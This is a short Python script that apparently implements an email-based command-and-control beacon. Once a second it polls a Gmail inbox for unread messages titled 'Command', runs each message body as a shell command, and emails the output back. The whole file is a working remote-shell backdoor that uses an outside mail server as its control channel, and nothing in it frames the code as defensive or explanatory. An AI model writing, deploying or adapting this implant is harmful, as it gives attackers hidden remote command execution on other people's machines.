import email
import time
import subprocess
import imaplib
import smtplib
from email.mime.text import MIMEText
import os
from dotenv import load_dotenv

load_dotenv()
IMAP_SERVER = 'imap.gmail.com'
SMTP_SERVER = 'smtp.gmail.com'
EMAIL = os.getenv("EMAIL")
PASSWORD = os.getenv("PASSWORD")

mail = imaplib.IMAP4_SSL(IMAP_SERVER)
mail.login(EMAIL, PASSWORD)
mail.select('inbox')

smtp = smtplib.SMTP_SSL(SMTP_SERVER, 465)
smtp.login(EMAIL, PASSWORD)


def beacon():
    while True:
        check_for_commands()
        time.sleep(1)

def check_for_commands():
    mail.select('inbox')
    #messages is a list of message ids (relative) that have "TestSubject" in the subject
    _, messages = mail.search(None, '(UNSEEN SUBJECT "Command")')
    for num in messages[0].split():
        #(RFC882) says to fetch the full raw contents of that email, using RFC 882 standard
        _, data = mail.fetch(num, '(RFC822)')
        raw_email = data[0][1]#email contents at this spot
        parse_and_execute(raw_email)
        mail.store(num, '+FLAGS', '\\Seen')
        mail.expunge()


def parse_and_execute(raw_email):
    msg = email.message_from_bytes(raw_email)
    if msg.is_multipart():
        for part in msg.walk():
            if part.get_content_type() == 'text/plain':
                command = part.get_payload(decode=True).decode()
                run_command(command)
    else:
        command = msg.get_payload(decode=True).decode()
        run_command(command)


def run_command(command):
    output = subprocess.getoutput(command)
    send_response(output)

def send_response(output):
    msg = MIMEText(output)
    msg['Subject'] = 'Response'
    msg['From'] = EMAIL
    msg['To'] = EMAIL
    smtp.sendmail(EMAIL, EMAIL, msg.as_string())

if '__main__' == __name__:
    beacon()